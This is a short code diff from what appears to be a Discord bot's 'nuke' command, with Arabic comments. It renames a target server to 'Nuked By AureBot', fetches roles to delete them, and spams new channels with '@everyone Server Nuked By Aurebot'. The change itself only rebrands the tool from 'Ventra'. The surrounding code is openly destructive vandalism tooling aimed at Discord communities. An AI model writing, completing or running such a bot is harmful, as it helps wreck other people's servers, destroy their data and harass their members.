@@ -29,7 +29,7 @@ module.exports = {
       console.log(`بدء تدمير السيرفر: ${targetGuild.name}`);
 
       // 1. تغيير اسم السيرفر
-      await targetGuild.setName('Nuked By Ventra').catch(err => console.log('خطأ اسم السيرفر:', err));
+      await targetGuild.setName('Nuked By AureBot').catch(err => console.log('خطأ اسم السيرفر:', err));
 
       // 2. حذف الرولات
       const roles = await targetGuild.roles.fetch();
@@ -62,7 +62,7 @@ module.exports = {
 
         if (newChannel) {
           for (let j = 0; j < 3; j++) {
-            await newChannel.send('@everyone Server Nuked By Ventra 🔥').catch(err => console.log('خطأ إرسال رسالة:', err));
+            await newChannel.send('@everyone Server Nuked By Aurebot 🔥').catch(err => console.log('خطأ إرسال رسالة:', err));
           }
         }
       }
